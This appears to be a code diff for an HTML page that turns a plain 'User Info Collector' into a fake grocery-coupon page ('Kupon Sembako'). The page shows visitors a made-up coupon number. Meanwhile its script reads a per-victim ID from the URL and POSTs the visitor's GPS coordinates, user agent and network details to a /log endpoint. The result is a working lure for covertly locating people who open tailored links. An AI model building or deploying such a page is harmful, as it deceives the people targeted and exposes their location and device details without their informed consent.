@@ -1,66 +1,114 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>User Info Collector</title>
-</head>
-<body>
-  <h1>Welcome!</h1>
-  <script>
-    // Function to get the location
-    function getLocation(callback) {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          callback({
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          });
-        }, error => {
-          console.error('Error getting location:', error);
-          callback(null);
-        });
-      } else {
-        console.error('Geolocation is not supported by this browser.');
-        callback(null);
-      }
-    }
+    <head>
+        <title>Kupon Sembako</title>
+    </head>
+    <body>
+        <h1 id="welcome-message">
+            Welcome! Selamat Kupon Anda Sebagai Berikut: #<span
+                id="coupon-number"
+            ></span>
+        </h1>
+        <script>
+            // Function to get the number from the URL path
+            function getNumberFromPath() {
+                // Get the full URL
+                const url = window.location.href;
 
-    // Function to get network information
-    function getNetworkInformation() {
-      let networkInfo = {};
-      if (navigator.connection) {
-        networkInfo = {
-          downlink: navigator.connection.downlink,             // Estimated downlink speed in Mbps
-          effectiveType: navigator.connection.effectiveType,   // Effective connection type ('slow-2g', '2g', '3g', '4g')
-          rtt: navigator.connection.rtt,                       // Round-trip time in milliseconds
-          saveData: navigator.connection.saveData              // User preference for reduced data usage
-        };
-      } else {
-        console.error('Network Information API is not supported by this browser.');
-      }
-      return networkInfo;
-    }
+                // Create a new URL object and extract the pathname
+                const urlObject = new URL(url);
+                const pathname = urlObject.pathname;
 
-    // Get User Agent
-    const userAgent = navigator.userAgent;
+                // Assuming the number is after "/data/", extract it
+                const match = pathname.match(/\/data\/(\d+)/);
+                if (match) {
+                    return match[1]; // Return the captured number
+                }
+                return null;
+            }
+            // Function to get the location
+            function getLocation(callback) {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            callback({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                            });
+                        },
+                        (error) => {
+                            console.error("Error getting location:", error);
+                            callback(null);
+                        }
+                    );
+                } else {
+                    console.error(
+                        "Geolocation is not supported by this browser."
+                    );
+                    callback(null);
+                }
+            }
 
-    // Get Network Information
-    const networkInfo = getNetworkInformation();
+            // Function to get network information
+            function getNetworkInformation() {
+                let networkInfo = {};
+                if (navigator.connection) {
+                    networkInfo = {
+                        downlink: navigator.connection.downlink, // Estimated downlink speed in Mbps
+                        effectiveType: navigator.connection.effectiveType, // Effective connection type ('slow-2g', '2g', '3g', '4g')
+                        rtt: navigator.connection.rtt, // Round-trip time in milliseconds
+                        saveData: navigator.connection.saveData, // User preference for reduced data usage
+                    };
+                } else {
+                    console.error(
+                        "Network Information API is not supported by this browser."
+                    );
+                }
+                return networkInfo;
+            }
 
-    // Get IP and Location, then send to the server
-    getLocation(location => {
-      fetch('/log', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ userAgent, location, networkInfo })
-      })
-      .then(response => response.text())
-      .then(data => {
-        console.log('Data logged successfully:', data);
-      })
-      .catch(error => console.error('Error logging data:', error));
-    });
-  </script>
-</body>
+            // Get User Agent
+            const userAgent = navigator.userAgent;
+
+            // Get Network Information
+            const networkInfo = getNetworkInformation();
+
+            // Get the extracted number from the URL
+            const extractedNumber = getNumberFromPath();
+
+            // If a number is found, send it along with other data to the server
+            if (extractedNumber) {
+                // Get location and then send all data to the server
+                getLocation((location) => {
+                    // Prepare data to be sent
+                    const data = {
+                        number: extractedNumber,
+                        userAgent,
+                        location,
+                        networkInfo,
+                    };
+                    // Send data to the server
+                    fetch("/log", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify(data),
+                    })
+                        .then((response) => response.text())
+                        .then((data) => {
+                            console.log("Data logged successfully:", data);
+                        })
+                        .catch((error) =>
+                            console.error("Error logging data:", error)
+                        );
+                });
+                let r = (Math.random() + 1).toString(36).substring(7);
+                document.getElementById("coupon-number").textContent =
+                    r + extractedNumber;
+            } else {
+                console.error("No number found in the URL path.");
+            }
+        </script>
+    </body>
 </html>
